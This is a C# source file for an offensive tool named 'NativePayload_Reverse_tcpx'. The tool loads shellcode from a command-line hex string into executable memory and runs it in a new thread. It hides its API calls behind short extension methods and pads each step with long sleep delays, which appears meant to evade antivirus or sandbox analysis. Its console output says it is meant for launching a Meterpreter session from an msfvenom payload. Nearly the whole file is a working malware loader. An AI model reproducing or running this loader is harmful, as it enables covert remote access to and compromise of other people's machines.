using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace NativePayload_Reverse_tcpx
{
    public static class test
    {
       
        [DllImport("kernel32")]
        public static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        public static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static UInt32 m = 0x1000;
        public static UInt32 d = 0x40;
        public static UInt32 VA(this UInt32 a, byte[] pp)
        {
            System.Threading.Thread.Sleep(10000);
            UInt32 f = VirtualAlloc(0, (UInt32)pp.Length, m, d);
            System.Threading.Thread.Sleep(10000);

            return f;
        }
        public static void CPY(this UInt32 b, byte[] src, IntPtr des)
        {
            System.Threading.Thread.Sleep(5000);
            Marshal.Copy(src, 0, (IntPtr)(des), src.Length);
        }
        public static IntPtr CT(this UInt32 c, UInt32 stadd, IntPtr x, UInt32 r)
        {
            IntPtr hThread = CreateThread(0, 0, stadd, x, 0, ref r);
            System.Threading.Thread.Sleep(3000);
            return hThread;
        }
        public static uint WSO(this UInt32 d, IntPtr hn)
        {
            System.Threading.Thread.Sleep(5000);
            return WaitForSingleObject(hn, 0xFFFFFFFF);
        }
    }
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_Reverse_tcpx , Published by Damon Mohammadbagher , Feb 2020");
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Gray;

            try
            {
                string[] pay1 = args[0].ToString().Split(',');
                
                byte[] p = new byte[pay1.Length];
                for (int i = 0; i < pay1.Length; i++)
                {  p[i] = Convert.ToByte( pay1[i],16 ); }

                UInt32 funcAddr2 = 1;
                UInt32 funcAddr1 = funcAddr2.VA(p);

                System.Threading.Thread.Sleep(5000);
                Convert.ToUInt32("2").CPY(p, (IntPtr)(funcAddr1));
                System.Threading.Thread.Sleep(5000);
                UInt32 tId = 0;
                System.Threading.Thread.Sleep(5000);
                IntPtr pin = IntPtr.Zero;
               
                System.Threading.Thread.Sleep(5000);
                Console.WriteLine("Bingo: X Meterpreter session by msfvenom Payload ;)");
                funcAddr2.WSO(Convert.ToUInt32("3").CT(funcAddr1, pin, tId));
                System.Threading.Thread.Sleep(5000);
            }
            catch (Exception echo)
            {
                Console.WriteLine(echo.Message);
            }

        }
    }
}
